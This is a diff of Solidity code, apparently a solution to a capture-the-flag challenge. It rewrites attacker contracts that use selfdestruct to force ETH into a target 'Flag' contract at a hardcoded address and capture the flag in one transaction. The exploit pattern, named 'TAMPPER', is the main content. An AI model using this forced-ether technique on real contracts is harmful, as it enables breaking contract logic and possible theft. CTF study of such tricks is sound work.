@@ -1,5 +1,6 @@
 pragma solidity 0.5.3;
 
+//The contract that's gonna be pwnd:
 contract Flag {
     mapping (address => bool) public captured;
 
@@ -22,39 +23,24 @@ contract Flag {
     }
 }
 
-//Used to trick the Flag contract into receiving ETH.
+//The ~ irresistible ~ money bag:
+//I'll call this "TAMPPER" (The Amazing Moneybag Pwnage PattERn)
+//Thanks, Xavier Leprêtre, for making me see this elegant solution
 contract MoneyBag {
-    //does nothing, but can store ETH
-    constructor() public payable {
-        
-    }
-    
-    function killMe() public {
-        selfdestruct(0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5);
+    constructor(address payable targetAddress) public payable {
+        selfdestruct(targetAddress);
     }
 }
 
-//Used to capture the flag in the same block MoneyBag is burst.
-//the spy won't have time to steal my money; no more mwahaha.
-contract ForcefulPhilantrope {
-    MoneyBag moneyBag;
-    Flag flag;
+//The PWNer:
+//*remember to send 1 wei when deploying
+contract Pwner {
+    address payable public constant victimsAddress = 0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5;
+    Flag public victim;
     
     constructor() public payable {
-        moneyBag = MoneyBag(0xB95408e89C68BF0F313872093e493ae5E607708e);
-        flag = Flag(0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5);
-    }
-    
-    function pwn() public {
-        moneyBag.killMe();
-        flag.capture("finally!");
-    }
-    
-    function peek() public {
-        flag.sneakUpOn();
-    }
-    
-    function() external payable {
-        
+        (new MoneyBag).value(msg.value)(victimsAddress);
+        victim = Flag(victimsAddress);
+        victim.capture("AYBABTU");
     }
 }
